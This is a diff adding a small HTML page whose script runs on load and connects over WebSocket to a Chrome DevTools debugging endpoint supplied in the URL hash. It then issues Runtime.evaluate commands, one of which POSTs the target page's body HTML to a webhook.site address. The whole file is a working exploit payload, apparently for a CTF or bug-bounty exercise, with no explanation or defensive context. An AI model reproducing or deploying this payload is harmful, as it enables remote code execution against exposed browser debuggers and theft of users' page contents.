@@ -1,0 +1,41 @@
+<body>
+<script>
+    function hack() {
+        window.ws = new WebSocket(location.hash.slice(1));
+
+
+        ws.onerror = (e => {
+            document.writeln('error')
+        });
+        ws.onmessage = (e => {
+            document.writeln("<p>" + e.data + "</p>");
+        });
+
+
+        ws.onopen = () => {
+            ws.send(JSON.stringify({
+                id: 1,
+                method: "Runtime.evaluate",
+                params: {
+                    expression: "location.href"
+                }
+            }));
+            ws.send(JSON.stringify({
+                id: 2,
+                method: "Runtime.evaluate",
+                params: {
+                    expression: "fetch('https://webhook.site/1a882048-3e0d-48ef-b415-18d445c743b6/AGA', {method:'POST', body: document.body.innerHTML}).then(data => console.log(data));"
+                }
+            }))
+
+        };
+
+        setTimeout(() => {
+            window.ws.close();
+            // location.reload();
+        }, 300)
+    }
+
+    window.onload = hack;
+</script>
+</body>
